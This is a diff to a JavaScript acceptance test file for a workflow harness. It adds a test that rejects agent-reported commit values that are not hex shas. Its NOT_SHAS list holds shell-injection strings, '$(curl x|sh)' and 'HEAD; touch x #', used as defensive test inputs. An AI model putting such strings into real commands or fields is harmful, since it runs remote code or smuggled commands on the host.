@@ -1,4 +1,4 @@
-// Acceptance tests for the commits group (docs/temper/v0-2/behaviour.md, COMMITS-01..12): commits
+// Acceptance tests for the commits group (docs/temper/v0-2/behaviour.md, COMMITS-01..13): commits
 // reach their branch, and every stage reports its commits (spec 3.1).
 // They drive the bundled workflows (build, stabilise, publish) through the harness with scripted
 // agents, the way the head launches them with args.json. A test that fails because of the product
@@ -344,8 +344,8 @@ test('COMMITS-09 an empty reported sha is left out of commits', async () => {
   for (const [id, sha] of Object.entries(result.commits)) assert.ok(typeof sha === 'string' && sha !== '', `${id}: empty sha`);
 
   // The same for stabilise and publish.
-  const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs(), respond: stabiliseResponder({ f1: 'aa11' }) });
-  assert.deepEqual(s.result.commits, { 'fix:f1': 'aa11' });
+  const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs(), respond: stabiliseResponder({ f1: 'aa11bb22' }) });
+  assert.deepEqual(s.result.commits, { 'fix:f1': 'aa11bb22' });
   const p = await runWorkflow('workflows/publish.js', {
     args: publishArgs(),
     respond: (q) => (q.label === 'docs' ? { commit: '', files: [], summary: 'nothing' } : publishResponder(q)),
@@ -386,4 +386,45 @@ test('COMMITS-11 a stabilise fix run returns commits mapping each fix:<id> to it
 test('COMMITS-12 a publish run returns commits with the docs and evidence shas', async () => {
   const { result } = await runWorkflow('workflows/publish.js', { args: publishArgs(), respond: publishResponder });
   assert.deepEqual(result.commits, { docs: 'd0c50001', evidence: 'e71d0002' });
+});
+
+// Owner's decision (spec 8, security-01): the head runs git on every commits value, so only a hex sha
+// goes in; any other reported value is left out and its id blocked with 'commit is not a sha'.
+const NOT_SHAS = ['$(curl x|sh)', 'HEAD; touch x #', 'HEAD'];
+
+test('COMMITS-13 a reported commit that is not a hex sha is left out of commits and blocked', async () => {
+  for (const bad of NOT_SHAS) {
+    // build: the phase that reported it blocks, and what came before it stays.
+    const b = await runBuild(buildArgs(), {
+      'acceptance:g1': { group: 'g1', passing: [], failing: [{ id: 'G1-01', observed: 'wrong' }], untestable: [], commit: bad },
+    });
+    assert.equal(b.result.status, 'blocked', `build ${bad}: ${JSON.stringify(b.result)}`);
+    assert.deepEqual(b.result.blocked, [{ id: 'acceptance:g1', reason: 'commit is not a sha' }], bad);
+    assert.deepEqual(b.result.commits, { checkpoint: SHAS.checkpoint, 'behaviour-spec': SHAS['behaviour-spec'] }, bad);
+    const cp = await runBuild(buildArgs(), {
+      checkpoint: { gate_passed: true, gate_log: 'full.log', flows: [], gaps: [], commit: bad },
+    });
+    assert.equal(cp.result.status, 'blocked', bad);
+    assert.deepEqual(cp.result.blocked, [{ id: 'checkpoint', reason: 'commit is not a sha' }], bad);
+    assert.deepEqual(cp.result.commits, {}, bad);
+
+    // stabilise: that fix is blocked, never counted fixed; the other fix's sha stays.
+    const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs(), respond: stabiliseResponder({ f1: bad, f2: 'f2f2f2f2' }) });
+    assert.equal(s.result.status, 'blocked', `stabilise ${bad}: ${JSON.stringify(s.result)}`);
+    assert.deepEqual(s.result.commits, { 'fix:f2': 'f2f2f2f2' }, bad);
+    assert.deepEqual(s.result.blocked, [{ id: 'f1', reason: 'commit is not a sha' }], bad);
+    assert.ok(!s.result.fixed.includes('f1'), bad);
+
+    // publish: docs or evidence blocks there, and nothing of it reaches commits.
+    for (const id of ['docs', 'evidence']) {
+      const p = await runWorkflow('workflows/publish.js', {
+        args: publishArgs(),
+        respond: (q) => (q.label === id ? { ...publishResponder(q), commit: bad } : publishResponder(q)),
+      });
+      assert.equal(p.result.status, 'blocked', `publish ${id} ${bad}: ${JSON.stringify(p.result)}`);
+      assert.deepEqual(p.result.blocked, [{ id, reason: 'commit is not a sha' }], bad);
+      assert.deepEqual(p.result.commits, id === 'docs' ? {} : { docs: 'd0c50001' }, bad);
+      for (const v of Object.values(p.result.commits)) assert.match(v, /^[0-9a-f]{7,40}$/);
+    }
+  }
 });
